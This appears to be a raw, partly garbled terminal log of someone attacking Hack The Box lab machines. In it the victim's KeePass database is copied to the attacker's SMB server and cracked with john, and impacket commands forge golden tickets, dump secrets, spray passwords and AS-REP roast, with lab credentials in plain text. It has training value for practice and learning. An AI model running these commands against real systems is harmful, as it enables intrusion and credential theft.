+[2026-02-06 11:28:38] [w=0:tmux] [p=%0] [OUT] dir
+[2026-02-06 11:28:49] [w=0:tmux] [p=%0] [OUT] cd ../../Administrator
+[2026-02-06 11:28:50] [w=0:tmux] [p=%0] [OUT] dir
+[2026-02-06 11:28:50] [w=0:tmux] [p=%0] [OUT] At line:1 char:1
+[2026-02-06 11:28:50] [w=0:tmux] [p=%0] [OUT] + dir
+[2026-02-06 11:28:50] [w=0:tmux] [p=%0] [OUT] + ~~~
+[2026-02-06 11:28:50] [w=0:tmux] [p=%0] [OUT] + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessExc
+[2026-02-06 11:28:50] [w=0:tmux] [p=%0] [OUT] eption
+[2026-02-06 11:28:50] [w=0:tmux] [p=%0] [OUT] + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+[2026-02-06 11:29:04] [w=0:tmux] [p=%0] [OUT] cd..
+[2026-02-06 11:29:23] [w=0:tmux] [p=%0] [OUT] dir C:\Users\kohsuke\Desktop
+[2026-02-06 11:29:23] [w=0:tmux] [p=%0] [OUT] Directory: C:\Users\kohsuke\Desktop
+[2026-02-06 11:29:23] [w=0:tmux] [p=%0] [OUT] Mode                LastWriteTime         Length Name
+[2026-02-06 11:29:23] [w=0:tmux] [p=%0] [OUT] ----                -------------         ------ ----
+[2026-02-06 11:29:23] [w=0:tmux] [p=%0] [OUT] -ar---        11/3/2017  11:22 PM             32 user.txt
+[2026-02-06 11:29:31] [w=0:tmux] [p=%0] [OUT] dir C:\Users\kohsuke\Documents
+[2026-02-06 11:29:31] [w=0:tmux] [p=%0] [OUT] Directory: C:\Users\kohsuke\Documents
+[2026-02-06 11:29:31] [w=0:tmux] [p=%0] [OUT] Mode                LastWriteTime         Length Name
+[2026-02-06 11:29:31] [w=0:tmux] [p=%0] [OUT] ----                -------------         ------ ----
+[2026-02-06 11:29:31] [w=0:tmux] [p=%0] [OUT] -a----        9/18/2017   1:43 PM           2846 CEH.kdbx
+[2026-02-06 11:29:37] [w=0:tmux] [p=%0] [OUT] dir C:\Users\kohsuke\Downloads
+[2026-02-06 11:29:44] [w=0:tmux] [p=%0] [OUT] cd..dir19@cd ../../Administrato
+[2026-02-06 11:29:45] [w=0:tmux] [p=%0] [OUT] dircd..dir C:\Users\kohsuke\Desktopocumenwnloa
+[2026-02-06 11:29:46] [w=0:tmux] [p=%0] [OUT] dir C:\Users\kohsuke\Downloa
+[2026-02-06 11:31:48] [w=0:tmux] [p=%0] [OUT] dir C:\Users\kohsuke\DownloaAdministraotyator\Desktioop
+[2026-02-06 11:31:48] [w=0:tmux] [p=%0] [OUT] dir C:\Users\Administrator\Desktop
+[2026-02-06 11:31:48] [w=0:tmux] [p=%0] [OUT] At line:1 char:1
+[2026-02-06 11:31:48] [w=0:tmux] [p=%0] [OUT] + dir C:\Users\Administrator\Desktop
+[2026-02-06 11:31:48] [w=0:tmux] [p=%0] [OUT] + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[2026-02-06 11:31:48] [w=0:tmux] [p=%0] [OUT] + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop:String) [Get-ChildItem], ItemNotFoundExc
+[2026-02-06 11:31:48] [w=0:tmux] [p=%0] [OUT] eption
+[2026-02-06 11:31:48] [w=0:tmux] [p=%0] [OUT] + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+[2026-02-06 11:32:56] [w=0:tmux] [p=%0] [OUT] systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+[2026-02-06 11:32:57] [w=0:tmux] [p=%0] [OUT] OS Name:                   Microsoft Windows 10 Pro
+[2026-02-06 11:32:57] [w=0:tmux] [p=%0] [OUT] OS Version:                10.0.10586 N/A Build 10586
+[2026-02-06 11:32:57] [w=0:tmux] [p=%0] [OUT] System Type:               x64-based PC
+[2026-02-06 11:35:28] [pane=%2] [CMD_START] cd Jeeves/loot
+[2026-02-06 11:35:32] [w=2:tmux] [p=%2] [OUT] c ket-ticketer -nthash "a4f2989236a639ef3f766e5fe1aad94a" -domain-sid "S-1-5-21-1487982659-1829050783-2281216199" -domain "puppy.htb" "administrator"ce
+[2026-02-06 11:35:35] [w=2:tmux] [p=%2] [OUT] ete c ket-ticketer -nthash "a4f2989236a639ef3f766e5fe1aad94a" -domain-sid "S-1-5-21-1487982659-1829050783-2281216199" -domain "puppy.htb" "administrator"ckkeett
+[2026-02-06 11:35:35] [w=2:tmux] [p=%2] [OUT] t -ticketer -nthash "a4f2989236a639ef3f766e5fe1aad94a" -domain-sid "S-1-5-21-1487982659-1829050783-2281216199" -domain "puppy.htb" "administrator"t--p
+[2026-02-06 11:35:36] [w=2:tmux] [p=%2] [OUT] sexec -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb-
+[2026-02-06 11:35:36] [w=2:tmux] [p=%2] [OUT] ticketer -nthash "a4f2989236a639ef3f766e5fe1aad94a" -domain-sid "S-1-5-21-1487982659-1829050783-2281216199" -domain "puppy.htb" "administrator"-s
+[2026-02-06 11:35:36] [w=2:tmux] [p=%2] [OUT] ecretsdump -k puppy.htb -k --sam
+[2026-02-06 11:35:36] [w=2:tmux] [p=%2] [OUT] sm
+[2026-02-06 11:35:37] [w=2:tmux] [p=%2] [OUT] bserver share . -smb2support -username test -password testmg
+[2026-02-06 11:35:37] [w=2:tmux] [p=%2] [OUT] m bserver share . -smb2support -username test -password testmb
+[2026-02-06 11:35:38] [w=2:tmux] [p=%2] [OUT] setebs
+[2026-02-06 11:35:41] [w=2:tmux] [p=%2] [OUT] seressernsernarvamvemeere impacket-smbserverr  r share /
+[2026-02-06 11:37:15] [w=2:tmux] [p=%2] [OUT] //hhoommee//bby/home/by /home/bb77hhe/home/b7heo  /home/b7hhw/home/b7hw /home/b7hh2/home/b7h2 /home/b7hh3300// / Do  /DDp/home/b7h30/Dpc  /home/b7h30/DDooccuum
+[2026-02-06 11:37:15] [w=2:tmux] [p=%2] [OUT] me
+[2026-02-06 11:37:15] [w=2:tmux] [p=%2] [OUT] en
+[2026-02-06 11:37:28] [w=2:tmux] [p=%2] [OUT] enttss//oobbsidian//ddooccs//HHt/home/b7h30/Documents/obsidian/docs/Htimpacket-smbserver
+[2026-02-06 11:37:28] [w=2:tmux] [p=%2] [OUT] Completing `file'
+[2026-02-06 11:37:30] [w=2:tmux] [p=%2] [OUT] impacket-smbserver share /home/b7h30/Documents/obsidian/docs/Htimpacket-smbserver /home/b7h30/Documents/obsidian/docs/H/ /C/home/b7h30/Documents/obsidian/docs/C
+[2026-02-06 11:37:30] [w=2:tmux] [p=%2] [OUT] Completing file
+[2026-02-06 11:37:30] [w=2:tmux] [p=%2] [OUT] Certifications\ and\ courses/                 Cryptography/
+[2026-02-06 11:37:30] [w=2:tmux] [p=%2] [OUT] Cisco\ Router/                                CTF/
+[2026-02-06 11:37:30] [w=2:tmux] [p=%2] [OUT] Computer\ Networks\ -\ A\ Systems\ Approach/  CyberSec\ Labs/
+[2026-02-06 11:37:36] [w=2:tmux] [p=%2] [OUT] impacket-smbserver share /home/b7h30/Documents/obsidian/docs/C/home/b7h30/Documents/obsidian/docs/CCTTF//HHt/home/b7h30/Documents/obsidian/docs/CTF/Ht/home/b7h30/Documents/obsidian/docs/CTF/HTB//JJeeeevvq/home/b7h30/Documents/obsidian/docs/CTF/HTB/Jeevqw  /home/b7h30/Documents/obsidian/docs/CTF/HTB/Jeev
+[2026-02-06 11:37:49] [w=2:tmux] [p=%2] [OUT] /home/b7h30/Documents/obsidian/docs/CTF/HTB/Jeeves/home/b7h30/Documents/obsidian/docs/CTF/HTB/Jeevess//lloooott t ---ssmmbb22aauupppp u a 2 2ssuuppppoorrt
+[2026-02-06 11:37:49] [pane=%2] [CMD_START] impacket-smbserver share /home/b7h30/Documents/obsidian/docs/CTF/HTB/Jeeves/loot -smb2support
+[2026-02-06 11:37:49] [w=2:tmux] [p=%2] [OUT] Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+[2026-02-06 11:38:59] [w=0:tmux] [p=%0] [OUT] copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.14.13\share\CEH.kdbx
+[2026-02-06 11:39:15] [w=2:tmux] [p=%2] [OUT] ^C
+[2026-02-06 11:39:15] [w=2:tmux] [p=%2] [OUT] Interrupted, exiting...
+[2026-02-06 11:39:17] [pane=%2] [CMD_START] ll
+[2026-02-06 11:39:17] [w=2:tmux] [p=%2] [OUT] total 8
+[2026-02-06 11:39:17] [w=2:tmux] [p=%2] [OUT] -rwxrwxr-x 1 b7h30 b7h30 2846 Nov  3  2017 CEH.kdbx
+[2026-02-06 11:39:17] [w=2:tmux] [p=%2] [OUT] -rw-rw-r-- 1 b7h30 b7h30  574 Feb  6 09:22 credentials.md
+[2026-02-06 11:39:38] [pane=%2] [CMD_START] keepass2john --help
+[2026-02-06 11:39:38] [w=2:tmux] [p=%2] [OUT] keepass2john: invalid option -- '-'
+[2026-02-06 11:39:38] [w=2:tmux] [p=%2] [OUT] Usage: keepass2john [-k <keyfile>] <.kdbx database(s)>
+[2026-02-06 11:40:07] [pane=%2] [CMD_START] keepass2john CEH.kdbx > keepass.hash
+[2026-02-06 11:40:09] [pane=%2] [CMD_START] ll
+[2026-02-06 11:40:09] [w=2:tmux] [p=%2] [OUT] total 12
+[2026-02-06 11:40:09] [w=2:tmux] [p=%2] [OUT] -rwxrwxr-x 1 b7h30 b7h30 2846 Nov  3  2017 CEH.kdbx
+[2026-02-06 11:40:09] [w=2:tmux] [p=%2] [OUT] -rw-rw-r-- 1 b7h30 b7h30  574 Feb  6 09:22 credentials.md
+[2026-02-06 11:40:09] [w=2:tmux] [p=%2] [OUT] -rw-rw-r-- 1 b7h30 b7h30  316 Feb  6 11:40 keepass.hash
+[2026-02-06 11:40:26] [w=2:tmux] [p=%2] [OUT] Completing `file'
+[2026-02-06 11:40:27] [w=2:tmux] [p=%2] [OUT] keepass2john kepkeepass2john keeeewkeewkeepass2john
+[2026-02-06 11:40:27] [w=2:tmux] [p=%2] [OUT] Completing `file'
+[2026-02-06 11:40:41] [w=2:tmux] [p=%2] [OUT] keepass2john keewkeepass2john keeepass.hash  - ----wwoorrkr rddlliisstt t =  t==.= =//uussrr/
+[2026-02-06 11:40:41] [w=2:tmux] [p=%2] [OUT] /s
+[2026-02-06 11:40:42] [w=2:tmux] [p=%2] [OUT] sh
+[2026-02-06 11:40:48] [w=2:tmux] [p=%2] [OUT] shaarree//wwoorrlr rddlliissttss//rro
+[2026-02-06 11:40:50] [w=2:tmux] [p=%2] [OUT] --wordlist=/usr/share/wordlists/rockyou.txt--wordlist=/usr/share/wordlists/rockyou.txt
+[2026-02-06 11:40:50] [pane=%2] [CMD_START] keepass2john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
+[2026-02-06 11:40:50] [w=2:tmux] [p=%2] [OUT] keepass2john: invalid option -- '-'
+[2026-02-06 11:40:50] [w=2:tmux] [p=%2] [OUT] Usage: keepass2john [-k <keyfile>] <.kdbx database(s)>
+[2026-02-06 11:41:13] [w=2:tmux] [p=%2] [OUT] keepass2john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txtsh
+[2026-02-06 11:41:13] [pane=%2] [CMD_START] keepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt
+[2026-02-06 11:41:13] [w=2:tmux] [p=%2] [OUT] keepass2john: invalid option -- 'w'
+[2026-02-06 11:41:13] [w=2:tmux] [p=%2] [OUT] Usage: keepass2john [-k <keyfile>] <.kdbx database(s)>
+[2026-02-06 11:41:31] [w=2:tmux] [p=%2] [OUT] keepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtkeepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtha keepassjohnar re e/ /w wo kor rd john
+[2026-02-06 11:41:31] [pane=%2] [CMD_START] john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt
+[2026-02-06 11:41:31] [w=2:tmux] [p=%2] [OUT] Error: Cannot find John home. Invoke the program via full or relative pathname.
+[2026-02-06 11:41:31] [w=2:tmux] [p=%2] [OUT] For example, /full/path/john or path/john, or set and use a shell alias.
+[2026-02-06 11:41:51] [w=2:tmux] [p=%2] [OUT] / /home/b7h30/.local/bin/nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file /etc/krb5.conf/u
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] /u/ussh/ushs /ussr/usrr./usr.r /usrr//s/usr/sshhaarre/usr/sharee//usr/share/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] Completing executable file
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] accountsservice/                  liblouis/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] aclocal/                          libmysofa/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] aclocal-1.18/                     libnumbertext/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] airgeddon/                        libpostal/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] alsa/                             libreoffice/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] alsa-card-profile/                libthai/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] altdns/                           libtool/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] android-framework-res/            libwacom/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] ant/                              licenses/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] apache2/                          lightdm/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] apktool/                          lightdm-gtk-greeter-settings/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] apparmor-features/                lighttpd/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] apple-bleee/                      ligolo-ng-common-binaries/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] application-registry/             lintian/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] applications/                     linux-exploit-suggester/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] apport/                           locale/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] apps/                             luajit-2.1/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] apt/                              lxsession/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] apt-file/                         lynis/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] arp-scan/                         macchanger/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] artifacts/                        magicrescue/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] aspell/                           maltego/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] atril/                            man/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] autoconf/                         mariadb/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] automake-1.18/                    matplotlib/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] autopsy/                          maven-repo/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] avahi/                            mc/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] awk/                              media-player-info/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] b374k/                            menu/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] backgrounds/                      mercurial/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] base-files/                       metagoofil/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] base-passwd/                      metainfo/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] bash-completion/                  metasploit-framework/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] bed/                              mfcuk/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] beef-xss/                         mfterm/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] bettercap/                        mime/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] binfmts/                          mime-info/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] bloodhound/                       mingw-w64/
+[2026-02-06 11:41:58] [w=2:tmux] [p=%2] [OUT] blue-hydra/                       misc/
+[2026-02-06 11:42:00] [w=2:tmux] [p=%2] [OUT] At Top: Hit TAB for more, or the character to insert
+[2026-02-06 11:42:16] [w=2:tmux] [p=%2] [OUT] /usr/share/john
+[2026-02-06 11:42:16] [pane=%2] [CMD_START] /usr/share/john
+[2026-02-06 11:42:21] [pane=%2] [CMD_START] cd -
+[2026-02-06 11:42:21] [w=2:tmux] [p=%2] [OUT] ~/Documents/obsidian/docs/CTF/HTB/Jeeves/loot
+[2026-02-06 11:42:38] [w=2:tmux] [p=%2] [OUT] john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtjohn keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtjohn keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtjohn keepass.hash -wordlist=/usr/share/wordlists/rockyou.txthdl johjoli jis st  keepass.hash/ keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt/ keepass.hash/u keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt/u/us keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtsr keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt/usrr. keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt/usr.rrd /usrr/ keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt/s keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt/usr/ssh keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtha keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtar keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtre keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt/usr/sharee/ keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt/j keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt/usr/share/jjo keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtog keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtgh keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt/usr/share/jogh keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtn keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt/usr/share/joghn keepass.hash -wordlist=/usr/share/wordlists/rockyou.txthsr gr/ o/s oh keepass.hash -wordlist=/usr/share/wordlists/rockyou.txthn keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt/usr/share/johnn  keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtn sr
+[2026-02-06 11:42:38] [pane=%2] [CMD_START] /usr/share/john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt
+[2026-02-06 11:42:38] [w=2:tmux] [p=%2] [OUT] zsh: permission denied: /usr/share/john
+[2026-02-06 11:42:44] [pane=%2] [CMD_START] sudo /usr/share/john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt
+[2026-02-06 11:42:46] [w=2:tmux] [p=%2] [OUT] [sudo] password for b7h30:
+[2026-02-06 11:42:48] [w=2:tmux] [p=%2] [OUT] Sorry, try again.
+[2026-02-06 11:42:50] [w=2:tmux] [p=%2] [OUT] [sudo] password for b7h30:
+[2026-02-06 11:42:50] [w=2:tmux] [p=%2] [OUT] sudo: /usr/share/john: command not found
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] ussrr//sshhaarree e e//jjoog/usr/share/jogh  /usr/share/joohhn
+[2026-02-06 11:43:05] [pane=%2] [CMD_START] ls /usr/share/john
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] 1password2john.py      dmg2john.py            leet.pl                   pkcs12kdf.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] 7z2john.pl             dns                    lib                       potcheck.pl
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] adxcsouf2john.py       DPAPImk2john.py        libreoffice2john.py       prosody2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] aem2john.py            ecryptfs2john.py       lion2john-alt.pl          pse2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] aix2john.pl            ejabberd2john.py       lion2john.pl              ps_token2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] aix2john.py            electrum2john.py       lm_ascii.chr              pwsafe2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] alnum.chr              encfs2john.py          lotus2john.py             __pycache__
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] alnumspace.chr         enpass2john.py         lower.chr                 radius2john.pl
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] alpha.chr              enpass5tojohn.py       lowernum.chr              radius2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] andotp2john.py         ethereum2john.py       lowerspace.chr            restic2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] androidbackup2john.py  filezilla2john.py      luks2john.py              rexgen2rules.pl
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] androidfde2john.py     fuzz.dic               mac2john-alt.py           rulestack.pl
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] ansible2john.py        fuzz_option.pl         mac2john.py               sap2john.pl
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] apex2john.py           geli2john.py           mcafee_epo2john.py        sense2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] applenotes2john.py     genincstats.rb         monero2john.py            sha-dump.pl
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] aruba2john.py          hccapx2john.py         money2john.py             sha-test.pl
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] ascii.chr              hextoraw.pl            mosquitto2john.py         signal2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] atmail2john.pl         htdigest2john.py       mozilla2john.py           sipdump2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] axcrypt2john.py        ibmiscanner2john.py    multibit2john.py          ssh2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] bestcrypt2john.py      ikescan2john.py        neo2john.py               sspr2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] bestcryptve2john.py    ios7tojohn.pl          netntlm.pl                staroffice2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] bitcoin2john.py        itunes_backup2john.pl  netscreen.py              stats
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] bitshares2john.py      iwork2john.py          office2john.py            strip2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] bitwarden2john.py      kdcdump2john.py        openbsd_softraid2john.py  telegram2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] bks2john.py            keychain2john.py       openssl2john.py           test_tezos2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] blockchain2john.py     keyring2john.py        padlock2john.py           tezos2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] ccache2john.py         keystore2john.py       pass_gen.pl               truecrypt2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] cisco2john.pl          kirbi2john.py          password.lst              unrule.pl
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] codepage.pl            known_hosts2john.py    pcap2john.py              upper.chr
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] cracf2john.py          krb2john.py            pdf2john.pl               uppernum.chr
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] dashlane2john.py       kwallet2john.py        pem2john.py               utf8.chr
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] deepsound2john.py      lanman.chr             pfx2john.py               vdi2john.pl
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] dictionary.rfc2865     lastpass2john.py       pgpdisk2john.py           vmx2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] digits.chr             latin1.chr             pgpsda2john.py            zed2john.py
+[2026-02-06 11:43:05] [w=2:tmux] [p=%2] [OUT] diskcryptor2john.py    ldif2john.pl           pgpwde2john.py            ztex
+[2026-02-06 11:43:22] [w=2:tmux] [p=%2] [OUT] bck-i-search: _ls /usr/share/johnh_impacket-smbserver share /home/b7h30/Documents/obsidian/docs/CTF/HTB/Jeeves/loot -smb2support
+[2026-02-06 11:43:22] [w=2:tmux] [p=%2] [OUT] bck-i-search: ho_ls /usr/share/john
+[2026-02-06 11:43:22] [w=2:tmux] [p=%2] [OUT] bck-i-search: h_
+[2026-02-06 11:43:27] [w=2:tmux] [p=%2] [OUT] _ ls /usr/share/johnj_joo_jo_ joo_ohh_hnn_sudo /usr/share/john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt
+[2026-02-06 11:43:49] [w=2:tmux] [p=%2] [OUT] bck-i-search: john_/t=/usr
+[2026-02-06 11:43:50] [w=2:tmux] [p=%2] [OUT] john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt
+[2026-02-06 11:43:58] [w=2:tmux] [p=%2] [OUT] bck-i-search: john_keepass2john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt-wordlist=/usr/share/wordlists/rockyou.txtCEH.kdbx > keepass.hash
+[2026-02-06 11:44:03] [w=2:tmux] [p=%2] [OUT] --help                         keepass2john --versionwhich keepass2john    keepass2john recovery.kdbx > passwords.kdbx.hash
+[2026-02-06 11:44:06] [w=2:tmux] [p=%2] [OUT] bck-i-search: john_x > passwords.kdbx.hashjohn -h recovery.kdbx
+[2026-02-06 11:44:25] [w=2:tmux] [p=%2] [OUT] sha1sum /usr/sbin/keepass2john          keepass2john recovery.kdbxjohn --version            keepass2john  ~/.local/bin/john --show recovery.hash-wordlist=/usr/share/wordlists/rockyou.txt recovery.hash
+[2026-02-06 11:44:27] [w=2:tmux] [p=%2] [OUT] bck-i-search: john_~/.local/bin/john --show -wordlist=/usr/share/wordlists/rockyou.txt
+[2026-02-06 11:44:27] [w=2:tmux] [p=%2] [OUT] recovery.hash
+[2026-02-06 11:44:27] [w=2:tmux] [p=%2] [OUT] ~/.local/bin/john --showkpcli                                 sudo kpclisudo keepass   keepasssudo apt install keepass2sudo aptkeepass2                 keepacd ../nmapcd ../nmapcat puppyNmapServicesVersions.txtcat puppyNnc -nv 10.129.232.75 3260        nc -nvsmbclient //10.129.232.75/ -U "adam.silver"%'Password123!' --sharessmbcli        smbclient-U "adam.silver"%'Password123!'ls
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] nxc smb 10.129.232.75 -u adam.silver -p 'Password123!' --usersnxc-u-p 'Password123!' --usersAdministrator -p 'JamieLove2025!'    r -p '025!'
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] 'Steve2025!'    
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] 'ILY2025!'  steph.cooper -p 'Steve2025!'-p 'S!'_adm -p 'Steve2025!'nxc-uadm -p 'Steve20ILY2025!'  nxc-u
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] -p 'ILY2025!'cat > puppy_passwords.txt << 'EOF'
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] KingofAkron2025!
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] HJKL2025!
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] Antman2025!
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] JamieLove2025!
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] Steve2025!
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] ILY2025!
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] Password123!
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] EOFcattxkron2025!
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] catnxc smb 10.129.232.75 -u steph.cooper_adm -p puppy_passwords.txt-u
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] -pimpacket-GetNPUsers puppy.htb/adam.silver:'Password123! -dc-ip 10.129.232.75 -request -format hashcat
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] packet-GetNPUserspp
